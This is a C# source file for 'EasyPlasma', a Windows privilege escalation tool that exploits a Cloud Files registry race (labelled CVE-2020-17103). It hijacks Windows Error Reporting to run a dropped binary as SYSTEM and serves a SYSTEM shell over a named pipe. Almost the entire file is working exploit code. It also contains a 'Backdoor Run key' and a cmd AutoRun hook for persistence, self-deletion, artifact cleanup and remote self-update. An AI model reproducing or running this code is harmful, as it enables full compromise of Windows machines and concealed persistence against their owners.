/*
 * easyplasma.cs  Single-EXE SYSTEM shell tool
 *
 * Fast path (after first run):
 *   Connects to named pipe from persistent syshost server -> instant SYSTEM shell
 *
 * Slow path (first run / server not running):
 *   MiniPlasma (CVE-2020-17103) escalation -> drops embedded syshost.exe
 *   -> WER runs syshost as SYSTEM -> syshost installs persistence + pipe server
 *
 * MODES:
 *   easyplasma.exe            escalate or connect to existing session
 *   easyplasma.exe install    install to user PATH
 *   easyplasma.exe update     download latest from GitHub
 *   easyplasma.exe --unpriv   cleanup and uninstall
 *
 * BUILD:
 *   cl.exe syshost.c /Fe:syshost.exe /O2 /MT /link kernel32.lib shlwapi.lib
 *   csc.exe /platform:x64 /optimize /out:easyplasma.exe easyplasma.cs /res:syshost.exe,syshost.exe
 */

using System;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

class EasyPlasma
{
    /* ── P/Invoke ────────────────────────────────────────────────────────── */

    [DllImport("cldapi.dll")] static extern int CfAbortOperation(int pid, IntPtr u, int f);
    [DllImport("ntdll.dll")]  static extern int NtImpersonateAnonymousToken(IntPtr t);
    [DllImport("ntdll.dll")]  static extern int NtSetInformationThread(IntPtr t, int c, ref IntPtr i, int s);
    [DllImport("ntdll.dll")]  static extern int NtOpenKey(out IntPtr h, uint a, ref OA oa);
    [DllImport("ntdll.dll")]  static extern int NtSetSecurityObject(IntPtr h, uint i, IntPtr sd);
    [DllImport("ntdll.dll")]  static extern int NtSetValueKey(IntPtr h, ref US n, int ti, uint t, byte[] d, int l);
    [DllImport("ntdll.dll")]  static extern int NtDeleteKey(IntPtr h);
    [DllImport("ntdll.dll")]  static extern int NtClose(IntPtr h);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
    [DllImport("kernel32.dll")] static extern IntPtr OpenThread(uint a, bool i, uint id);
    [DllImport("advapi32.dll")] static extern bool ImpersonateAnonymousToken(IntPtr t);
    [DllImport("advapi32.dll")] static extern bool RevertToSelf();
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode)]
    static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
        string s, uint r, out IntPtr p, out int l);
    [DllImport("kernel32.dll")] static extern IntPtr LocalFree(IntPtr h);

    [StructLayout(LayoutKind.Sequential)] struct US {
        public ushort L, M; public IntPtr B;
        public US(string s){B=Marshal.StringToHGlobalUni(s);L=(ushort)(s.Length*2);M=(ushort)(L+2);}
        public void Free(){if(B!=IntPtr.Zero){Marshal.FreeHGlobal(B);B=IntPtr.Zero;}}
    }
    [StructLayout(LayoutKind.Sequential)] struct OA {
        public int Len; public IntPtr Root,Name; public uint Attr; public IntPtr SD,QoS;
        public OA(string p, uint attr=0x40){
            Len=Marshal.SizeOf(typeof(OA)); Root=IntPtr.Zero;
            var u=new US(p); Name=Marshal.AllocHGlobal(Marshal.SizeOf(typeof(US)));
            Marshal.StructureToPtr(u,Name,false); Attr=attr; SD=IntPtr.Zero; QoS=IntPtr.Zero;
        }
        public void Free(){
            if(Name!=IntPtr.Zero){
                var u=(US)Marshal.PtrToStructure(Name,typeof(US)); u.Free();
                Marshal.FreeHGlobal(Name); Name=IntPtr.Zero;
            }
        }
    }

    const uint KEY_ALL_ACCESS        = 0xF003F;
    const uint KEY_WRITE_DAC         = 0x00040000;
    const uint KEY_WRITE_OWNER       = 0x00080000;
    const uint KEY_DELETE            = 0x00010000;
    const uint KEY_SET_VALUE         = 0x0002;
    const uint KEY_ENUMERATE_SUBKEYS = 0x0008;
    const uint OBJ_OPENLINK          = 0x100;
    const uint OBJ_CASE_INSENSITIVE  = 0x40;
    const uint REG_OPTION_CREATE_LINK= 2;
    const uint REG_OPTION_VOLATILE   = 1;
    const uint REG_SZ                = 1;
    const uint REG_LINK              = 6;
    const uint THREAD_IMPERSONATE        = 0x0100;
    const uint THREAD_SET_THREAD_TOKEN   = 0x0080;
    const uint THREAD_QUERY_INFORMATION  = 0x0040;
    const uint DACL_INFO = 4, LABEL_INFO = 0x10;

    static string SDDL =>
        "D:(A;OICIIO;GA;;;"+"WD)(A;OICIIO;GA;;;"+"AN)(A;;GA;;;"
        +"WD)(A;;GA;;;"+"AN)S:(ML;OICI;NW;;;"+"S-1-16-0)";

    static string _reg = string.Join("\\","","Registry","User",".DEFAULT");
    static string CF   => string.Join("\\",_reg,"Software","Policies","Microsoft","CloudFiles");
    static string BA   => CF + "\\BlockedApps";
    static string TK   => string.Join("\\",_reg,"Volatile Environment");

    const string PipeName = "easyplasma";
    const string BaseUrl  = "https://raw.githubusercontent.com/Dylanthedabber/EasyPlasma/main/";
    const string CfgPath  = @"C:\ProgramData\ep_active.cfg";

    static string InstallDir =>
        Path.Combine(Environment.GetFolderPath(
            Environment.SpecialFolder.LocalApplicationData), "EasyPlasma");

    /* ── Registry helpers ────────────────────────────────────────────────── */

    static IntPtr OKey(string path, uint access)
    {
        var oa = new OA(path, OBJ_CASE_INSENSITIVE|OBJ_OPENLINK);
        IntPtr h; int r = NtOpenKey(out h, access, ref oa); oa.Free();
        if (r==0) return h;
        ImpersonateAnonymousToken(GetCurrentThread());
        oa = new OA(path, OBJ_CASE_INSENSITIVE|OBJ_OPENLINK);
        r = NtOpenKey(out h, access, ref oa); oa.Free();
        RevertToSelf();
        return r==0 ? h : IntPtr.Zero;
    }

    static void MakeWritable(string path)
    {
        IntPtr h = OKey(path, KEY_WRITE_DAC);
        if (h!=IntPtr.Zero) { ApplySD(h, DACL_INFO); NtClose(h); }
        h = OKey(path, KEY_WRITE_OWNER);
        if (h!=IntPtr.Zero) { ApplySD(h, LABEL_INFO); NtClose(h); }
    }

    static void ApplySD(IntPtr h, uint info)
    {
        IntPtr p; int l;
        if (ConvertStringSecurityDescriptorToSecurityDescriptor(SDDL,1,out p,out l)) {
            NtSetSecurityObject(h,info,p); LocalFree(p);
        }
    }

    static void RecDelete(string path)
    {
        MakeWritable(path);
        string win32 = path.StartsWith(@"\Registry\User\")
            ? path.Substring(@"\Registry\User\".Length) : path;
        string[] subs = null;
        try { using(var rk=Registry.Users.OpenSubKey(win32)) if(rk!=null) subs=rk.GetSubKeyNames(); } catch{}
        if (subs!=null) foreach(var s in subs) RecDelete(path+"\\"+s);
        IntPtr h = OKey(path, KEY_DELETE);
        if (h!=IntPtr.Zero) { NtDeleteKey(h); NtClose(h); }
    }

    /* ── TOCTOU ──────────────────────────────────────────────────────────── */

    static volatile bool _tDone;

    static void ToggleAnon(object rh)
    {
        IntPtr h = (IntPtr)rh;
        try {
            while (!_tDone) {
                NtImpersonateAnonymousToken(h);
                IntPtr z = IntPtr.Zero;
                NtSetInformationThread(h, 5, ref z, IntPtr.Size);
            }
        } catch {}
        NtClose(h);
    }

    static void RunToctou()
    {
        _tDone = false;
        int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
        IntPtr real = OpenThread(
            THREAD_IMPERSONATE|THREAD_SET_THREAD_TOKEN|THREAD_QUERY_INFORMATION,
            false, GetCurrentThreadId());
        new Thread(ToggleAnon){IsBackground=true}.Start(real);
        int i=0; bool found=false;
        while (i<100000 && !found) {
            CfAbortOperation(pid, IntPtr.Zero, 2);
            if (++i%10000==0) {
                Console.Write(".");
                try { using(var k=Registry.Users.OpenSubKey(
                    @".DEFAULT\Software\Policies\Microsoft\CloudFiles"))
                    if(k!=null) found=true; } catch{}
            }
        }
        _tDone = true;
        Console.WriteLine($" ok={found}");
    }

    static void CreateSymlinkPS(string link, string target)
    {
        string tmp = Path.Combine(Path.GetTempPath(),"ep_"+Guid.NewGuid().ToString("N").Substring(0,6)+".ps1");
        string ps = @"
Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class NR {
  [StructLayout(LayoutKind.Sequential)] public struct US {
    public ushort L,M; public IntPtr B;
    public US(string s){B=Marshal.StringToHGlobalUni(s);L=(ushort)(s.Length*2);M=(ushort)(L+2);}
    public void Free(){if(B!=IntPtr.Zero){Marshal.FreeHGlobal(B);B=IntPtr.Zero;}}
  }
  [StructLayout(LayoutKind.Sequential)] public struct OA {
    public int Len; public IntPtr Root,Name; public uint Attr; public IntPtr SD,QoS;
    public OA(string p){Len=Marshal.SizeOf(typeof(OA));Root=IntPtr.Zero;
      var u=new US(p);Name=Marshal.AllocHGlobal(Marshal.SizeOf(typeof(US)));
      Marshal.StructureToPtr(u,Name,false);Attr=0x140;SD=IntPtr.Zero;QoS=IntPtr.Zero;}
  }
  [DllImport(""ntdll.dll"")] public static extern int NtCreateKey(out IntPtr h,uint a,ref OA oa,int ti,ref US c,uint opt,out uint d);
  [DllImport(""ntdll.dll"")] public static extern int NtSetValueKey(IntPtr h,ref US n,int ti,uint t,byte[] d,int l);
  [DllImport(""ntdll.dll"")] public static extern int NtClose(IntPtr h);
}
'@ -Language CSharp
$oa=[NR+OA]::new('LNKPATH'); $c=[NR+US]::new(''); [uint32]$d=0; [IntPtr]$h=[IntPtr]::Zero
$r=[NR]::NtCreateKey([ref]$h,0xF003F,[ref]$oa,0,[ref]$c,3,[ref]$d)
if($r-eq 0){
  $vn=[NR+US]::new('SymbolicLinkValue')
  $tb=[System.Text.Encoding]::Unicode.GetBytes('TGTPATH')
  [NR]::NtSetValueKey($h,[ref]$vn,0,6,$tb,$tb.Length)|Out-Null
  $vn.Free(); [NR]::NtClose($h)|Out-Null
  Write-Host '[+] Symlink OK'
} else { Write-Host ('[-] 0x'+$r.ToString('X8')) }
".Replace("LNKPATH",link).Replace("TGTPATH",target);
        File.WriteAllText(tmp,ps);
        var p = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
            "powershell.exe", $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{tmp}\"")
            {UseShellExecute=false});
        p.WaitForExit(20000);
        try{File.Delete(tmp);}catch{}
    }

    /* ── MiniPlasma ──────────────────────────────────────────────────────── */

    static bool RunMiniPlasma(string syshostPath, string runDir)
    {
        Console.WriteLine("[*] Stage 1: TOCTOU..."); Console.Write("    ");
        RunToctou();
        using(var k=Registry.Users.OpenSubKey(@".DEFAULT\Software\Policies\Microsoft\CloudFiles"))
            if(k==null){Console.WriteLine("[-] Stage 1 failed");return false;}
        Console.WriteLine("[+] Stage 1 done");

        Console.WriteLine("[*] Stage 2: Symlink...");
        RecDelete(BA); Thread.Sleep(300);
        RecDelete(TK); Thread.Sleep(200);
        MakeWritable(CF); Thread.Sleep(100);
        CreateSymlinkPS(BA, TK);
        Console.Write("    S2 TOCTOU: "); RunToctou();
        Console.WriteLine("[+] Stage 2 done");

        Console.WriteLine("[*] Stage 3: windir + WER...");
        MakeWritable(TK); Thread.Sleep(200);

        bool wrote = false;
        IntPtr hTK = OKey(TK, KEY_SET_VALUE);
        if (hTK!=IntPtr.Zero) {
            var vn = new US("windir");
            var wb = System.Text.Encoding.Unicode.GetBytes(runDir+"\0");
            wrote = NtSetValueKey(hTK,ref vn,0,REG_SZ,wb,wb.Length)==0;
            vn.Free(); NtClose(hTK);
        }
        if (!wrote) {
            try {
                var rk = Registry.Users.OpenSubKey(@".DEFAULT\Volatile Environment",true)
                      ?? Registry.Users.CreateSubKey(@".DEFAULT\Volatile Environment");
                rk?.SetValue("windir",runDir); rk?.Close(); wrote=true;
            } catch {}
        }
        if (!wrote){Console.WriteLine("[-] windir write failed");return false;}
        Console.WriteLine($"[+] windir = {runDir}");

        string sys32 = Path.Combine(runDir,"System32");
        Directory.CreateDirectory(sys32);
        File.Copy(syshostPath, Path.Combine(sys32,"wermgr.exe"), true);

        var psi = new System.Diagnostics.ProcessStartInfo("schtasks.exe",
            @"/run /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting""")
            {UseShellExecute=false,CreateNoWindow=true};
        using(var p=System.Diagnostics.Process.Start(psi)) p.WaitForExit(3000);

        Thread.Sleep(1500);
        /* Clean MiniPlasma artifacts immediately */
        try{RecDelete(CF);}catch{}
        try{RecDelete(TK);}catch{}
        try{if(Directory.Exists(runDir))Directory.Delete(runDir,true);}catch{}
        Console.WriteLine("[+] Artifacts cleaned");
        return true;
    }

    /* ── Syshost extraction ──────────────────────────────────────────────── */

    static string ExtractSyshost()
    {
        Directory.CreateDirectory(InstallDir);
        string dest = Path.Combine(InstallDir,"syshost.exe");
        var asm = Assembly.GetExecutingAssembly();
        using(var s = asm.GetManifestResourceStream("syshost.exe")) {
            if (s!=null) {
                byte[] b = new byte[s.Length]; s.Read(b,0,b.Length);
                File.WriteAllBytes(dest,b);
                Console.WriteLine("[+] syshost extracted");
                return dest;
            }
        }
        /* Fallback: look next to exe */
        string local = Path.Combine(
            Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName),
            "syshost.exe");
        if (File.Exists(local)) { File.Copy(local,dest,true); return dest; }
        Console.WriteLine("[-] syshost not found in resources or local dir");
        return null;
    }

    /* ── Fast path: connect to running pipe server ───────────────────────── */

    static bool TryFastPath()
    {
        try {
            using (var pipe = new NamedPipeClientStream(".", PipeName, PipeDirection.InOut)) {
                pipe.Connect(500); /* 500ms timeout */
                Console.WriteLine("[+] Fast path: SYSTEM server is running");
                /* Send our PID */
                int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
                byte[] pidBytes = BitConverter.GetBytes(pid);
                pipe.Write(pidBytes, 0, 4);
                /* Wait for OK */
                byte[] ok = new byte[2];
                pipe.Read(ok, 0, 2);
                Console.WriteLine("[+] SYSTEM shell ready");
                return true;
            }
        } catch {
            return false;
        }
    }

    /* ── Install / Update / Uninstall ────────────────────────────────────── */

    static bool Download(string filename, string dest)
    {
        try {
            Console.WriteLine($"[*] Downloading {filename}...");
            ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)3072;
            using(var wc = new WebClient()) wc.DownloadFile(BaseUrl+filename, dest);
            Console.WriteLine($"[+] Done");
            return true;
        } catch(Exception ex) {
            Console.WriteLine($"[-] Download failed: {ex.Message}");
            return false;
        }
    }

    static void Install()
    {
        string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        string selfDir = Path.GetDirectoryName(self);
        Directory.CreateDirectory(InstallDir);
        File.Copy(self, Path.Combine(InstallDir,"easyplasma.exe"), true);

        /* Add to PATH */
        string curPath = Registry.CurrentUser.OpenSubKey(@"Environment")
            ?.GetValue("PATH","") as string ?? "";
        if (curPath.ToLower().IndexOf(InstallDir.ToLower()) < 0)
            Registry.CurrentUser.OpenSubKey(@"Environment",true)
                ?.SetValue("PATH", curPath.TrimEnd(';')+";"+InstallDir);
        Console.WriteLine("[+] Added to PATH");

        /* AutoRun doskey */
        Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Command Processor")
            .SetValue("AutoRun", $"doskey easyplasma=\"{Path.Combine(InstallDir,"easyplasma.exe")}\" $*");
        Console.WriteLine("[+] AutoRun doskey set");

        /* Backdoor Run key */
        Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run")
            .SetValue("EPMaintenance", $"\"{Path.Combine(InstallDir,"easyplasma.exe")}\" --prep");
        Console.WriteLine("[+] Persistence set");

        /* Self-delete source */
        if (!string.Equals(selfDir, InstallDir, StringComparison.OrdinalIgnoreCase)) {
            string cmd = $"/c ping -n 2 127.0.0.1 >nul & del /F /Q \"{self}\"";
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
                "cmd.exe",cmd){CreateNoWindow=true,UseShellExecute=false});
        }
        Console.WriteLine("[+] Install complete. Open a new cmd and type: easyplasma");
    }

    static void Update()
    {
        Download("easyplasma.exe", Path.Combine(Path.GetTempPath(),"ep_update.exe"));
        string installed = Path.Combine(InstallDir,"easyplasma.exe");
        string tmp = Path.Combine(Path.GetTempPath(),"ep_update.exe");
        if (File.Exists(tmp)) {
            string cmd = $"/c ping -n 2 127.0.0.1 >nul & move /Y \"{tmp}\" \"{installed}\"";
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
                "cmd.exe",cmd){CreateNoWindow=true,UseShellExecute=false});
            Console.WriteLine("[+] Update applied. Open a new cmd.");
        }
    }

    static void Uninstall()
    {
        Console.WriteLine("[*] Cleaning...");
        try{RecDelete(CF);}catch{}
        try{RecDelete(TK);}catch{}
        /* Remove scheduled task */
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
            "schtasks.exe",@"/delete /f /tn ""\EasyPlasma\Maintenance""")
            {UseShellExecute=false,CreateNoWindow=true})?.WaitForExit(3000);
        /* Remove registry */
        try{Registry.CurrentUser.OpenSubKey(@"Environment",true)?.DeleteValue("PATH",false);}catch{}
        try{
            string p = Registry.CurrentUser.OpenSubKey(@"Environment")
                ?.GetValue("PATH","") as string ?? "";
            p=p.Replace(";"+InstallDir,"").Replace(InstallDir+";","").Replace(InstallDir,"");
            Registry.CurrentUser.OpenSubKey(@"Environment",true)?.SetValue("PATH",p);
        }catch{}
        try{Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Command Processor",true)
            ?.DeleteValue("AutoRun",false);}catch{}
        try{Registry.CurrentUser.OpenSubKey(
            @"Software\Microsoft\Windows\CurrentVersion\Run",true)
            ?.DeleteValue("EPMaintenance",false);}catch{}
        try{if(Directory.Exists(InstallDir))Directory.Delete(InstallDir,true);}catch{}
        Console.WriteLine("[+] Done. All traces removed.");
    }

    static void Prep()
    {
        /* Silent re-prep: run Stage 1 TOCTOU to keep CF key world-writable */
        try { Console.Write("[prep] "); RunToctou(); MakeWritable(CF); } catch {}
    }

    /* ── Main ────────────────────────────────────────────────────────────── */

    static void Main(string[] args)
    {
        string mode = args.Length>0 ? args[0].ToLower() : "";
        if (mode=="install")  { Install();   return; }
        if (mode=="update")   { Update();    return; }
        if (mode=="--unpriv"||mode=="unpriv") { Uninstall(); return; }
        if (mode=="--prep")   { Prep();      return; }

        Console.WriteLine("=== EasyPlasma ===\n");

        /* Fast path: pipe server already running */
        Console.WriteLine("[*] Checking for existing SYSTEM session...");
        if (TryFastPath()) {
            /* syshost has AttachConsole'd and spawned SYSTEM cmd.
               priv.exe's job is done — just hold console alive briefly
               then exit so SYSTEM cmd takes full control. */
            Thread.Sleep(500);
            return;
        }
        Console.WriteLine("[*] No existing session. Running full escalation...\n");

        /* Extract syshost from embedded resources */
        string syshostPath = ExtractSyshost();
        if (syshostPath==null) return;

        string id = Guid.NewGuid().ToString("N").Substring(0,8);
        string runDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            "mp_"+id);
        Directory.CreateDirectory(runDir);

        /* Write config for syshost: install dir so it can persist itself */
        File.WriteAllText(CfgPath, InstallDir);

        /* Run MiniPlasma */
        if (!RunMiniPlasma(syshostPath, runDir)) {
            try{File.Delete(CfgPath);}catch{}
            return;
        }

        /* Wait for pipe server to come up (syshost is starting) */
        Console.WriteLine("[*] Waiting for SYSTEM server...");
        for (int i=0; i<30; i++) {
            Thread.Sleep(700);
            Console.Write(".");
            if (TryFastPath()) {
                Console.WriteLine("\n[+] SYSTEM shell active");
                Thread.Sleep(500);
                return;
            }
        }
        Console.WriteLine("\n[-] Timed out. Check C:\\ProgramData\\ep_debug.log");
        try{File.Delete(CfgPath);}catch{}
    }
}
